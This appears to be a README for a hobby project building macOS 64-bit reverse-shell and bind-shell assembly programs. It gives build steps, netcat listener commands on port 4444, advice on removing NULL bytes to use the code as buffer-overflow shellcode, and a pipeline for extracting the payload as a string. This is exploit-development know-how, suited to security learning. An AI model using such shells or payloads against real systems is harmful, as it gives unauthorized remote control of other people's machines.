reverse_shell
=============

program that call out to a service that is listening to port 4444, the ip is set to any for simplicity.

It is written for mac osx 64 bit

#### reverse_shell, Usage:
  Start a listening server with the command: `nc -l 4444` in another folder for example your home directory
```
  nasm -g -f macho64 reverse_shell.s
  ld  -arch x86_64 -macosx_version_min 10.7.0 -lSystem -o reverse_shell reverse_shell.o
  ./reverse_shell
```  

#### bindshell, Usage:
  bindshell start a listening server that you can connect to with the command: `nc -nv 127.0.0.1 4444` in another folder for example your home directory
  (Had some problem with the code, but @norsec0de and @TheColonial helped me to fix it, big thx to them for the help)
```
  nasm -g -f macho64 bindshell.s
  ld  -arch x86_64 -macosx_version_min 10.7.0 -lSystem -o bindshell bindshell.o
  ./bindshell
```  
Go to the terminal and run `nc -nv 127.0.0.1 4444` then type ls, you should now see a directory listing of the directory you started
bindshell in.


To use the code as a payload, one need to remove the NULL bytes, these can be found by running: otool -lV reverse_shell and identify
the mov instructions that need to be modified. The reason are the numerous NULL bytes (\x00). 
Most buffer overflow errors are related to C stdlib string functions: strcpy(), sprintf(), strcat(), 
and so on. All of these functions use the NULL symbol to indicate the end of a string. 
Therefore, a function will not read shellcode after the first occurring NULL byte.
There are other delimiters like linefeed (0x0A), carriage return (0x0D), 0xFF, and others.
See the code for two example on how to change the mov instruction

#### Binary to string
To convert the binary to string values that can be used as a payload use
```
  gobjdump -d ./$1|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g' > dump.txt
```
  By inspecting this file, we see why NULL(0x00) is a problem as in C a string is terminated by NULL so these has to be removed
  A simple `paste -d'\0' -s dump.txt` will combine all rows into one that can then be copied into the C file.
  A more simple command to use is the osx otool, `otool -t reverse_shell_no_bad_values.o` we test our reverse_shell code in a simple c-program.  